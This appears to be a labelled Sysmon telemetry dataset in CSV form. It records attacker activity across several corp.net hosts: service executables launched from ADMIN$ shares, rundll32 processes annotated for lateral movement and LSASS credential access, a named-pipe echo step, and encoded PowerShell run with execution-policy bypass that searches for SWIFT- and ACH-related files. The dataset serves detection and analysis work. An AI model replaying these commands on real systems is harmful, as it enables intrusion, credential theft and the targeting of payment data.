datetime,subject,raw,pid,ppid,process_name,parent_process_name,cmdline,user,report_desc,mitre_tactic
2022-08-05 22:24:41+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:24:41.851743100Z""/>
    <EventRecordID>176204</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1444"" ThreadID=""1932""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-07.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:24:41.230</Data>
    <Data Name=""ProcessGuid"">{7A60D74F-98A9-62ED-0000-0010F6C3B101}</Data>
    <Data Name=""ProcessId"">3744</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
    <Data Name=""ParentProcessId"">3208</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",3744,3208,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:25:33+00:00,ACC-07,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:25:33.475373000Z""/>
    <EventRecordID>176354</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1444"" ThreadID=""1932""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-07.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:25:33.008</Data>
    <Data Name=""ProcessGuid"">{7A60D74F-98DD-62ED-0000-00108A1BB901}</Data>
    <Data Name=""ProcessId"">4740</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{7A60D74F-9871-62ED-0000-00207BD9B001}</Data>
    <Data Name=""LogonId"">0x0000000001b0d97b</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{7A60D74F-981A-62ED-0000-00105758B001}</Data>
    <Data Name=""ParentProcessId"">3208</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",4740,3208,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:26:26+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:26:26.293062200Z""/>
    <EventRecordID>194306</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:26:26.293</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-9912-62ED-0000-0010B3C2EF01}</Data>
    <Data Name=""ProcessId"">4264</Data>
    <Data Name=""Image"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
    <Data Name=""FileVersion"">?</Data>
    <Data Name=""Description"">?</Data>
    <Data Name=""Product"">?</Data>
    <Data Name=""Company"">?</Data>
    <Data Name=""CommandLine"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=EB1EF2CC4520FB57C1F73817E7261BC6,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-647E-62ED-0000-001032920000}</Data>
    <Data Name=""ParentProcessId"">484</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
  </EventData>
</Event>
",4264,484,\\ACC-04\ADMIN$\42f7d05.exe,C:\Windows\System32\services.exe,\\ACC-04\ADMIN$\42f7d05.exe,NT AUTHORITY\SYSTEM,,
2022-08-05 22:26:27+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:26:27.325696400Z""/>
    <EventRecordID>194314</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:26:27.322</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
    <Data Name=""ProcessId"">4092</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-9912-62ED-0000-0010B3C2EF01}</Data>
    <Data Name=""ParentProcessId"">4264</Data>
    <Data Name=""ParentImage"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
    <Data Name=""ParentCommandLine"">\\ACC-04\ADMIN$\42f7d05.exe</Data>
  </EventData>
</Event>
",4092,4264,C:\Windows\SysWOW64\rundll32.exe,\\ACC-04\ADMIN$\42f7d05.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
2022-08-05 22:28:02+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:28:02.346602500Z""/>
    <EventRecordID>194641</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:28:02.330</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-9972-62ED-0000-001017C1F201}</Data>
    <Data Name=""ProcessId"">4300</Data>
    <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-647E-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=DD81D91FF3B0763C392422865C9AC12E,IMPHASH=F8F47A970BADB255F8249475E7FBEABB</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
    <Data Name=""ParentProcessId"">4092</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",4300,4092,C:\Windows\System32\rundll32.exe,C:\Windows\SysWOW64\rundll32.exe,C:\Windows\sysnative\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to access LSASS,Credential Access
2022-08-05 22:28:03+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:28:03.077367400Z""/>
    <EventRecordID>194645</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:28:03.077</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-9973-62ED-0000-0010BFC9F201}</Data>
    <Data Name=""ProcessId"">4952</Data>
    <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
    <Data Name=""FileVersion"">6.1.7601.17514 (win7sp1_rtm.101119-1850)</Data>
    <Data Name=""Description"">Windows Command Processor</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\system32\cmd.exe /c echo 2b34c792c33 &gt; \\.\pipe\fee489</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
    <Data Name=""LogonId"">0x0000000001f2c968</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=5746BD7E255DD6A8AFA06F7C42C1BA41,IMPHASH=D0058544E4588B1B2290B7F4D830EB0A</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-9972-62ED-0000-001017C1F201}</Data>
    <Data Name=""ParentProcessId"">4300</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\sysnative\rundll32.exe</Data>
  </EventData>
</Event>
",4952,4300,C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,C:\Windows\system32\cmd.exe /c echo 2b34c792c33 &gt; \\.\pipe\fee489,NT AUTHORITY\SYSTEM,,
2022-08-05 22:29:38+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:29:38.921359700Z""/>
    <EventRecordID>195144</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:29:38.905</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-99D2-62ED-0000-0010D03EF701}</Data>
    <Data Name=""ProcessId"">3736</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
    <Data Name=""LogonId"">0x0000000001f2c968</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
    <Data Name=""ParentProcessId"">4092</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",3736,4092,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgAEMAOgBcACAALQBSAGUAYwB1AHIAcwBlACAALQBJAG4AYwBsAHUAZABlACAAKgBzAHcAaQBmAHQAKgA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:30:33+00:00,ACC-04,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:30:33.638360900Z""/>
    <EventRecordID>195500</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1440"" ThreadID=""1960""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-04.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:30:33.607</Data>
    <Data Name=""ProcessGuid"">{0EBA84BE-9A09-62ED-0000-00100C0B0302}</Data>
    <Data Name=""ProcessId"">1264</Data>
    <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name=""FileVersion"">10.0.14409.1005 (rs1_srvoob.161208-1155)</Data>
    <Data Name=""Description"">Windows PowerShell</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{0EBA84BE-9973-62ED-0000-002068C9F201}</Data>
    <Data Name=""LogonId"">0x0000000001f2c968</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=A575A7610E5F003CC36DF39E07C4BA7D,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453</Data>
    <Data Name=""ParentProcessGuid"">{0EBA84BE-9913-62ED-0000-0010ACC8EF01}</Data>
    <Data Name=""ParentProcessId"">4092</Data>
    <Data Name=""ParentImage"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\System32\rundll32.exe</Data>
  </EventData>
</Event>
",1264,4092,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\SysWOW64\rundll32.exe,powershell -nop -exec bypass -EncodedCommand VABlAHMAdAAtAFAAYQB0AGgAIABDADoAXABBAEMASAA=,NT AUTHORITY\SYSTEM,,
2022-08-05 22:31:36+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:31:36.502307900Z""/>
    <EventRecordID>177563</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1472"" ThreadID=""2036""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-02.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:31:35.901</Data>
    <Data Name=""ProcessGuid"">{BEDB1A18-9A47-62ED-0000-00100C1CE701}</Data>
    <Data Name=""ProcessId"">4496</Data>
    <Data Name=""Image"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
    <Data Name=""FileVersion"">?</Data>
    <Data Name=""Description"">?</Data>
    <Data Name=""Product"">?</Data>
    <Data Name=""Company"">?</Data>
    <Data Name=""CommandLine"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{BEDB1A18-644A-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=C7F7C90E47C5E24FECC19CCEF2EC820F,IMPHASH=DE77F3139EAF74F1B255AB7BE0B6605F</Data>
    <Data Name=""ParentProcessGuid"">{BEDB1A18-644A-62ED-0000-00103A940000}</Data>
    <Data Name=""ParentProcessId"">500</Data>
    <Data Name=""ParentImage"">C:\Windows\System32\services.exe</Data>
    <Data Name=""ParentCommandLine"">C:\Windows\system32\services.exe</Data>
  </EventData>
</Event>
",4496,500,\\ACC-02\ADMIN$\b9b362b.exe,C:\Windows\System32\services.exe,\\ACC-02\ADMIN$\b9b362b.exe,NT AUTHORITY\SYSTEM,,
2022-08-05 22:31:38+00:00,ACC-02,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
  <System>
    <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}""/>
    <EventID>1</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>1</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime=""2022-08-05T22:31:38.343515500Z""/>
    <EventRecordID>177608</EventRecordID>
    <Correlation/>
    <Execution ProcessID=""1472"" ThreadID=""2036""/>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>ACC-02.corp.net</Computer>
    <Security UserID=""S-1-5-18""/>
  </System>
  <EventData>
    <Data Name=""RuleName""/>
    <Data Name=""UtcTime"">2022-08-05 22:31:38.265</Data>
    <Data Name=""ProcessGuid"">{BEDB1A18-9A4A-62ED-0000-0010B685E701}</Data>
    <Data Name=""ProcessId"">4776</Data>
    <Data Name=""Image"">C:\Windows\SysWOW64\rundll32.exe</Data>
    <Data Name=""FileVersion"">6.1.7600.16385 (win7_rtm.090713-1255)</Data>
    <Data Name=""Description"">Windows host process (Rundll32)</Data>
    <Data Name=""Product"">Microsoft® Windows® Operating System</Data>
    <Data Name=""Company"">Microsoft Corporation</Data>
    <Data Name=""CommandLine"">C:\Windows\System32\rundll32.exe</Data>
    <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
    <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    <Data Name=""LogonGuid"">{BEDB1A18-644A-62ED-0000-0020E7030000}</Data>
    <Data Name=""LogonId"">0x00000000000003e7</Data>
    <Data Name=""TerminalSessionId"">0</Data>
    <Data Name=""IntegrityLevel"">System</Data>
    <Data Name=""Hashes"">MD5=51138BEEA3E2C21EC44D0932C71762A8,IMPHASH=EF8A44FE2F9AD4AB85E55004AAA024A9</Data>
    <Data Name=""ParentProcessGuid"">{BEDB1A18-9A47-62ED-0000-00100C1CE701}</Data>
    <Data Name=""ParentProcessId"">4496</Data>
    <Data Name=""ParentImage"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
    <Data Name=""ParentCommandLine"">\\ACC-02\ADMIN$\b9b362b.exe</Data>
  </EventData>
</Event>
",4776,4496,C:\Windows\SysWOW64\rundll32.exe,\\ACC-02\ADMIN$\b9b362b.exe,C:\Windows\System32\rundll32.exe,NT AUTHORITY\SYSTEM,Sacrificial process (rundll32) spawned to move laterally,Lateral Movement
